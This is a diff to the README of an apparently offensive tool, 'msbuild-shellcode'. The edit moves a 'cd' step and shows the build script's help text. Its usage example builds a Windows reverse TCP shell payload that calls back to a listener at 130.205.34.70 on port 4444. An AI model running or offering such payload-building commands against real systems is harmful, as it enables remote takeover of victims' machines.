@@ -15,18 +15,18 @@ git clone https://github.com/jmrcsnchz/msbuild-shellcode.git
 pip3 install argparse
 ```
 ```bash
+cd msbuild-shellcode
+```
+```bash
 python3 build.py -h
 
 usage: build.py [-h] -x PAYLOAD -l LHOST -p LPORT [-a ARCH]
 build.py: error: the following arguments are required: -x/--payload, -l/--lhost, -p/--lport
 ```
 
-
 ## Usage
 
-```bash
-cd msbuild-shellcode
-```
+
 
 ```bash
 python3 build.py -a x86 -x windows/shell_reverse_tcp -l 130.205.34.70 -p 4444
